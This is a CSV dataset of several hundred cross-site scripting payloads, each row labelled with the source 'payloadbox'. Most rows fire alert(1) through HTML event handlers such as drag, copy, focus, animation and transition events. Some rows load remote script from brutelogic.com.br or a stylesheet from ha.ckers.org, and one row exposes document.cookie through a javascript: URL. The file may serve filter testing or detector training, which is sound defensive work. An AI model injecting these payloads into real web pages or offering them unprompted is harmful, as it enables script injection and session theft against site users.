text,source
"<style>@keyframes slidein {}</style><u style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></u>",payloadbox
"<style>@keyframes x{}</style><thead style=""animation-name:x"" onanimationend=""alert(1)""></thead>",payloadbox
"<dl onmouseup=""alert(1)"">test</dl>",payloadbox
"<nav onmousedown=""alert(1)"">test</nav>",payloadbox
<x onxxx%3D1,payloadbox
"<details draggable=""true"" ondragstart=""alert(1)"">test</details>",payloadbox
"<samp oncopy=""alert(1)"" contenteditable>test</samp>",payloadbox
"<ruby onmouseover=""alert(1)"">test</ruby>",payloadbox
"<style>:target {transform: rotate(180deg);}</style><del id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></del>",payloadbox
"<dir draggable=""true"" ondragend=""alert(1)"">test</dir>",payloadbox
"<style>@keyframes slidein {}</style><ruby style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></ruby>",payloadbox
<div style=xss:expression(1)-alert(1)>,payloadbox
"<template draggable=""true"" ondragenter=""alert(1)"">test</template>",payloadbox
"<video oncopy=""alert(1)"" contenteditable>test</video>",payloadbox
<xmp id=x tabindex=1 onbeforedeactivate=alert(1)></xmp><input autofocus>,payloadbox
"<h1 draggable=""true"" ondragenter=""alert(1)"">test</h1>",payloadbox
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><article id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></article>",payloadbox
"<meta onkeydown=""alert(1)"" contenteditable>test</meta>",payloadbox
"<br oncut=""alert(1)"" contenteditable>test</br>",payloadbox
"<aside onmouseout=""alert(1)"">test</aside>",payloadbox
<datalist onblur=alert(1) tabindex=1 id=x></datalist><input autofocus>,payloadbox
"<rtc onbeforecopy=""alert(1)"" contenteditable>test</rtc>",payloadbox
<hr onblur=alert(1) tabindex=1 id=x></hr><input autofocus>,payloadbox
<style id=x tabindex=1 ondeactivate=alert(1)></style><input id=y autofocus>,payloadbox
"<header draggable=""true"" ondrag=""alert(1)"">test</header>",payloadbox
<content id=x tabindex=1 onfocusin=alert(1)></content>,payloadbox
<body onblur=alert(1) id=x><iframe id=x>,payloadbox
<section id=x tabindex=1 onfocusin=alert(1)></section>,payloadbox
"<u draggable=""true"" ondragstart=""alert(1)"">test</u>",payloadbox
<address id=x tabindex=1 onfocusin=alert(1)></address>,payloadbox
"<a draggable=""true"" ondragstart=""alert(1)"">test</a>",payloadbox
"<style>:target {color: red;}</style><font id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></font>",payloadbox
"<sup onmousedown=""alert(1)"">test</sup>",payloadbox
"<sup onbeforecut=""alert(1)"" contenteditable>test</sup>",payloadbox
<svg><dt onload=alert(1)></dt>,payloadbox
"<abbr onkeyup=""alert(1)"" contenteditable>test</abbr>",payloadbox
"<details onmouseenter=""alert(1)"">test</details>",payloadbox
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><colgroup id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></colgroup>",payloadbox
"<listing ondblclick=""alert(1)"">test</listing>",payloadbox
"<shadow onmousemove=""alert(1)"">test</shadow>",payloadbox
"<input type=""text"" value=``<div/onmouseover='alert(1)'>X</div>",payloadbox
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><area id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></area>",payloadbox
"<samp onbeforecut=""alert(1)"" contenteditable>test</samp>",payloadbox
<form><input formaction=javascript:alert(1) type=submit value=click>,payloadbox
"<wbr oncopy=""alert(1)"" contenteditable>test</wbr>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><ins ondragover=alert(1) contenteditable>drop here</ins>",payloadbox
"<strike oncontextmenu=""alert(1)"">test</strike>",payloadbox
"<ruby oncopy=""alert(1)"" contenteditable>test</ruby>",payloadbox
"<style>@keyframes x{}</style><image style=""animation-name:x"" onanimationstart=""alert(1)""></image>",payloadbox
<object onfocusout=alert(1) tabindex=1 id=x></object><input autofocus>,payloadbox
"<style>:target {color:red;}</style><html id=x style=""transition:color 1s"" ontransitionend=alert(1)></html>",payloadbox
"<audio ondblclick=""alert(1)"">test</audio>",payloadbox
"<select onmouseout=""alert(1)"">test</select>",payloadbox
"<style>:target {color:red;}</style><rt id=x style=""transition:color 1s"" ontransitionend=alert(1)></rt>",payloadbox
"<dd onmousedown=""alert(1)"">test</dd>",payloadbox
"<center onkeypress=""alert(1)"" contenteditable>test</center>",payloadbox
"<command oncut=""alert(1)"" contenteditable>test</command>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><sup ondragover=alert(1) contenteditable>drop here</sup>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><td ondragover=alert(1) contenteditable>drop here</td>",payloadbox
<col id=x tabindex=1 onfocus=alert(1)></col>,payloadbox
"<style>:target {color: red;}</style><picture id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></picture>",payloadbox
<applet onfocusout=alert(1) tabindex=1 id=x></applet><input autofocus>,payloadbox
"<var onbeforepaste=""alert(1)"" contenteditable>test</var>",payloadbox
"<textarea onmousedown=""alert(1)"">test</textarea>",payloadbox
"<footer onpaste=""alert(1)"" contenteditable>test</footer>",payloadbox
"<big oncopy=""alert(1)"" contenteditable>test</big>",payloadbox
"<style>@keyframes x{}</style><del style=""animation-name:x"" onanimationstart=""alert(1)""></del>",payloadbox
"<caption onbeforecopy=""alert(1)"" contenteditable>test</caption>",payloadbox
"<listing onmousemove=""alert(1)"">test</listing>",payloadbox
"<time onmouseout=""alert(1)"">test</time>",payloadbox
"<object draggable=""true"" ondragstart=""alert(1)"">test</object>",payloadbox
"<data onmousedown=""alert(1)"">test</data>",payloadbox
"<section ondblclick=""alert(1)"">test</section>",payloadbox
"<style>@keyframes x{}</style><dialog style=""animation-name:x"" onanimationend=""alert(1)""></dialog>",payloadbox
<svg><span onload=alert(1)></span>,payloadbox
"<table draggable=""true"" ondragleave=""alert(1)"">test</table>",payloadbox
"<html onmouseenter=""alert(1)"">test</html>",payloadbox
"<param onmouseover=""alert(1)"">test</param>",payloadbox
<font onfocusout=alert(1) tabindex=1 id=x></font><input autofocus>,payloadbox
"<div draggable=""true"" contenteditable>drag me</div><blink ondragover=alert(1) contenteditable>drop here</blink>",payloadbox
<font id=x tabindex=1 onbeforeactivate=alert(1)></font>,payloadbox
"<big onbeforecopy=""alert(1)"" contenteditable>test</big>",payloadbox
"""><iframe%20src=""http://google.com""%%203E",payloadbox
"<multicol onmouseup=""alert(1)"">test</multicol>",payloadbox
"<legend oncut=""alert(1)"" contenteditable>test</legend>",payloadbox
"<hr oncut=""alert(1)"" contenteditable>test</hr>",payloadbox
"<style>:target {transform: rotate(180deg);}</style><script id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></script>",payloadbox
"<dt onbeforecopy=""alert(1)"" contenteditable>test</dt>",payloadbox
<deTAiLs/open/oNtoGGle=confirm()>,payloadbox
"<main draggable=""true"" ondragstart=""alert(1)"">test</main>",payloadbox
"<style>:target {transform: rotate(180deg);}</style><tt id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></tt>",payloadbox
"<font onkeyup=""alert(1)"" contenteditable>test</font>",payloadbox
"<bdi draggable=""true"" ondragleave=""alert(1)"">test</bdi>",payloadbox
"<dt onbeforecut=""alert(1)"" contenteditable>test</dt>",payloadbox
"<noembed oncut=""alert(1)"" contenteditable>test</noembed>",payloadbox
"<style>:target {color:red;}</style><caption id=x style=""transition:color 1s"" ontransitionend=alert(1)></caption>",payloadbox
"<style>:target {color: red;}</style><script id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></script>",payloadbox
<output id=x tabindex=1 onbeforedeactivate=alert(1)></output><input autofocus>,payloadbox
"<LINK REL=""stylesheet"" HREF=""http://ha.ckers.org/xss.css"">",payloadbox
<image id=x tabindex=1 onactivate=alert(1)></image>,payloadbox
<body id=x tabindex=1 onfocus=alert(1)></body>,payloadbox
"<picture onclick=""alert(1)"">test</picture>",payloadbox
"<style>:target {transform: rotate(180deg);}</style><multicol id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></multicol>",payloadbox
"<rt onpaste=""alert(1)"" contenteditable>test</rt>",payloadbox
"</svg>//[""'`-->]]>]</div>",payloadbox
"<strike draggable=""true"" ondrag=""alert(1)"">test</strike>",payloadbox
"<style>:target {transform: rotate(180deg);}</style><colgroup id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></colgroup>",payloadbox
"<map onpaste=""alert(1)"" contenteditable>test</map>",payloadbox
"<shadow onmouseup=""alert(1)"">test</shadow>",payloadbox
"<style>@keyframes x{}</style><sup style=""animation-name:x"" onanimationend=""alert(1)""></sup>",payloadbox
"<p draggable=""true"" ondragenter=""alert(1)"">test</p>",payloadbox
<body onscroll=alert(1)><br><br><br><br>,payloadbox
"<style>:target {color: red;}</style><tbody id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></tbody>",payloadbox
"<head draggable=""true"" ondrag=""alert(1)"">test</head>",payloadbox
"<span onmouseout=""alert(1)"">test</span>",payloadbox
"<style>@keyframes slidein {}</style><label style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></label>",payloadbox
"<rb onmouseleave=""alert(1)"">test</rb>",payloadbox
"<button onmouseup=""alert(1)"">test</button>",payloadbox
"<style>@keyframes x{}</style><big style=""animation-name:x"" onanimationstart=""alert(1)""></big>",payloadbox
"<style>:target {transform: rotate(180deg);}</style><menu id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></menu>",payloadbox
"<style>:target {color:red;}</style><data id=x style=""transition:color 1s"" ontransitionend=alert(1)></data>",payloadbox
"<option onmouseout=""alert(1)"">test</option>",payloadbox
"<listing draggable=""true"" ondragenter=""alert(1)"">test</listing>",payloadbox
"<body onbeforecopy=""alert(1)"" contenteditable>test</body>",payloadbox
<time id=x tabindex=1 ondeactivate=alert(1)></time><input id=y autofocus>,payloadbox
<svg><figure onload=alert(1)></figure>,payloadbox
"<style>@keyframes x{}</style><small style=""animation-name:x"" onanimationend=""alert(1)""></small>",payloadbox
"<p onkeyup=""alert(1)"" contenteditable>test</p>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><wbr ondrop=alert(1) contenteditable>drop here</wbr>",payloadbox
<s id=x tabindex=1 onfocus=alert(1)></s>,payloadbox
<col id=x tabindex=1 onactivate=alert(1)></col>,payloadbox
<br/><hr/>jAvascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//<br/><hr/>,payloadbox
"<div draggable=""true"" contenteditable>drag me</div><select ondragover=alert(1) contenteditable>drop here</select>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><video ondragover=alert(1) contenteditable>drop here</video>",payloadbox
"<section onmousemove=""alert(1)"">test</section>",payloadbox
"<p onkeydown=""alert(1)"" contenteditable>test</p>",payloadbox
"<marquee onmousemove=""alert(1)"">test</marquee>",payloadbox
"<plaintext onmouseover=""alert(1)"">test</plaintext>",payloadbox
"<script src=""//brutelogic.com.br&sol;1.js&num;",payloadbox
"<menuitem oncut=""alert(1)"" contenteditable>test</menuitem>",payloadbox
"<nextid onmouseup=""alert(1)"">test</nextid>",payloadbox
"<figure onmousemove=""alert(1)"">test</figure>",payloadbox
"<label oncopy=""alert(1)"" contenteditable>test</label>",payloadbox
"<style>:target {color: red;}</style><strong id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></strong>",payloadbox
"<audio onloadeddata=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",payloadbox
"<caption onkeypress=""alert(1)"" contenteditable>test</caption>",payloadbox
"<col onkeydown=""alert(1)"" contenteditable>test</col>",payloadbox
<kbd id=x tabindex=1 onfocusin=alert(1)></kbd>,payloadbox
"<button ondblclick=""alert(1)"">test</button>",payloadbox
<tr id=x tabindex=1 ondeactivate=alert(1)></tr><input id=y autofocus>,payloadbox
"<iframe oncopy=""alert(1)"" contenteditable>test</iframe>",payloadbox
<param onfocusout=alert(1) tabindex=1 id=x></param><input autofocus>,payloadbox
<legend id=x tabindex=1 onbeforedeactivate=alert(1)></legend><input autofocus>,payloadbox
"""><script src=//brutelogic.com.br&sol;1.js&num;",payloadbox
<svg><area onload=alert(1)></area>,payloadbox
"<style>@keyframes x{}</style><source style=""animation-name:x"" onanimationstart=""alert(1)""></source>",payloadbox
"<basefont onmousemove=""alert(1)"">test</basefont>",payloadbox
"<plaintext onkeydown=""alert(1)"" contenteditable>test</plaintext>",payloadbox
"<style>@keyframes slidein {}</style><frameset style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></frameset>",payloadbox
"<rtc onkeydown=""alert(1)"" contenteditable>test</rtc>",payloadbox
"<img onkeypress=""alert(1)"" contenteditable>test</img>",payloadbox
"<button draggable=""true"" ondrag=""alert(1)"">test</button>",payloadbox
"<rb oncopy=""alert(1)"" contenteditable>test</rb>",payloadbox
"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",payloadbox
"<command onkeydown=""alert(1)"" contenteditable>test</command>",payloadbox
"<dir onmouseover=""alert(1)"">test</dir>",payloadbox
<rt id=x tabindex=1 onfocusin=alert(1)></rt>,payloadbox
<x contenteditable onkeypress=alert(1)>press any key!,payloadbox
"<shadow onmouseover=""alert(1)"">test</shadow>",payloadbox
<svg><rb onload=alert(1)></rb>,payloadbox
"<b onbeforecopy=""alert(1)"" contenteditable>test</b>",payloadbox
<aside id=x tabindex=1 onactivate=alert(1)></aside>,payloadbox
"<style>@keyframes slidein {}</style><applet style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></applet>",payloadbox
"<content oncopy=""alert(1)"" contenteditable>test</content>",payloadbox
"<style>@keyframes slidein {}</style><noscript style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></noscript>",payloadbox
"<meta onpaste=""alert(1)"" contenteditable>test</meta>",payloadbox
<svg id=x tabindex=1 onactivate=alert(1)></svg>,payloadbox
"<style>@keyframes x{}</style><kbd style=""animation-name:x"" onanimationend=""alert(1)""></kbd>",payloadbox
<tr id=x tabindex=1 onbeforeactivate=alert(1)></tr>,payloadbox
"<div id=""108""><!-- IE 5-8 standards mode -->",payloadbox
"<colgroup onmouseout=""alert(1)"">test</colgroup>",payloadbox
<img srcset=1 onerror=alert(1)>,payloadbox
"<strike onkeypress=""alert(1)"" contenteditable>test</strike>",payloadbox
"<style>:target {color: red;}</style><source id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></source>",payloadbox
"<div onmouseover=""alert(1)"">test</div>",payloadbox
<mark id=x tabindex=1 onfocus=alert(1)></mark>,payloadbox
"<element onkeypress=""alert(1)"" contenteditable>test</element>",payloadbox
"<track oncontextmenu=""alert(1)"">test</track>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><ol ondragover=alert(1) contenteditable>drop here</ol>",payloadbox
"<tbody draggable=""true"" ondragend=""alert(1)"">test</tbody>",payloadbox
"<style>:target {transform: rotate(180deg);}</style><label id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></label>",payloadbox
"<frameset draggable=""true"" ondrag=""alert(1)"">test</frameset>",payloadbox
<script id=x tabindex=1 ondeactivate=alert(1)></script><input id=y autofocus>,payloadbox
"<style>:target {transform: rotate(180deg);}</style><aside id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></aside>",payloadbox
"<del draggable=""true"" ondrag=""alert(1)"">test</del>",payloadbox
<rp id=x tabindex=1 ondeactivate=alert(1)></rp><input id=y autofocus>,payloadbox
<summary id=x tabindex=1 onbeforeactivate=alert(1)></summary>,payloadbox
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><title id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></title>",payloadbox
<slot onblur=alert(1) tabindex=1 id=x></slot><input autofocus>,payloadbox
"<marquee onmouseup=""alert(1)"">test</marquee>",payloadbox
"<pre draggable=""true"" ondragstart=""alert(1)"">test</pre>",payloadbox
<blink id=x tabindex=1 ondeactivate=alert(1)></blink><input id=y autofocus>,payloadbox
"<style>@keyframes x{}</style><tt style=""animation-name:x"" onanimationend=""alert(1)""></tt>",payloadbox
"<center oncontextmenu=""alert(1)"">test</center>",payloadbox
<command onfocusout=alert(1) tabindex=1 id=x></command><input autofocus>,payloadbox
"<div draggable=""true"" contenteditable>drag me</div><dfn ondrop=alert(1) contenteditable>drop here</dfn>",payloadbox
